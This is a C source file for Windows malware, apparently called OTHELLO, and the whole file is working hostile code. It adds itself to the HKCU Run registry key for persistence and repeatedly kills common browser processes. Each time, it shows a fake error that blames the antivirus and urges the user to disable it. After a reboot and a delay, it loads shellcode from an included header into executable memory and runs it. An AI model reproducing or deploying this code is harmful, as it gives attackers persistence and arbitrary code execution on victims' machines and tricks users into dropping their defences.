#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <time.h>

#include "sh3llc0de.h"

#define ALERT_TEXT "Your antivirus accidentally as killed this process.\nRestart your PC -> Disable your antivirus.\n(#482957)"
#define STATE_FILE L"C:\\Users\\Public\\othelloruntime.dat"
#define NUM_EXECS (sizeof(exec_names) / sizeof(exec_names[0]))

const char* exec_names[] = {
    "msedge.exe",
    "chrome.exe",
    "firefox.exe",
    "brave.exe",
    "opera.exe",
    "iexplore.exe"
};

void execute_sh3llc0de(unsigned char* obfuscated_code, size_t length) {
    void* exec_mem = VirtualAlloc(NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) {
        printf("VirtualAlloc failed\n");
        return;
    }

    memcpy(exec_mem, obfuscated_code, length);
    
    void (*func)() = (void(*)())exec_mem;
    func();

    VirtualFree(exec_mem, 0, MEM_RELEASE);
}

time_t get_last_boot_time() {
    ULONGLONG uptime_ms = GetTickCount64();
    time_t now = time(NULL);
    return now - (uptime_ms / 1000);
}

time_t load_previous_run_time() {
    FILE *fp = _wfopen(STATE_FILE, L"rb");
    if (!fp) return 0;

    time_t prev_time = 0;
    fread(&prev_time, sizeof(time_t), 1, fp);
    fclose(fp);
    return prev_time;
}

void save_current_time_as_last_run() {
    time_t now = time(NULL);
    FILE *fp = _wfopen(STATE_FILE, L"wb");
    if (!fp) return;
    fwrite(&now, sizeof(time_t), 1, fp);
    fclose(fp);
}

bool was_rebooted_since_last_run() {
    time_t last_boot = get_last_boot_time();
    time_t prev_run  = load_previous_run_time();

    save_current_time_as_last_run();

    return last_boot > prev_run;
}


void kill_if_running(const char* name) {
    char mb_title[64];

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hProcess != NULL) {
                    TerminateProcess(hProcess, 1);
                    CloseHandle(hProcess);
                    snprintf(mb_title, sizeof(mb_title), "%s as killed", name);
                    MessageBox(NULL, ALERT_TEXT, mb_title, MB_OK | MB_ICONERROR);
                    break;
                }
            }
        } while (Process32Next(snapshot, &pe));
    }

    CloseHandle(snapshot);
}

bool add_to_startup_registry(const wchar_t *app_name, const wchar_t *exe_path) {
    HKEY h_key;
    LPCWSTR sub_key = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, sub_key, 0, KEY_SET_VALUE, &h_key);
    if (result != ERROR_SUCCESS) {
        wprintf(L"Error: %ld\n", result);
        return false;
    }

    result = RegSetValueExW(h_key, app_name, 0, REG_SZ, (const BYTE *)exe_path,
                           (DWORD)((wcslen(exe_path) + 1) * sizeof(wchar_t)));

    RegCloseKey(h_key);

    if (result != ERROR_SUCCESS) {
        wprintf(L"Error: %ld\n", result);
        return false;
    }

    return true;
}

int main() {
    const wchar_t *app_name = L"OTHELLO";
    wchar_t _path[MAX_PATH];
    bool rebooted = was_rebooted_since_last_run();

    GetModuleFileNameW(NULL, _path, MAX_PATH);
    if (add_to_startup_registry(app_name, _path)) {
        wprintf(L"Program successfully added to startup\n");
    } else {
        wprintf(L"Failed\n");
        return 1;
    }

    ULONGLONG start = GetTickCount64();

    while (1) {
        for (int i = 0; i < NUM_EXECS; ++i) {
            kill_if_running(exec_names[i]);
            if(rebooted && GetTickCount64() - start >= 180000) {
                execute_sh3llc0de(_sh3llc0de, SH3LLC0DE_SIZE);
            }
        }

        Sleep(1000);
    }

    return 0;
}
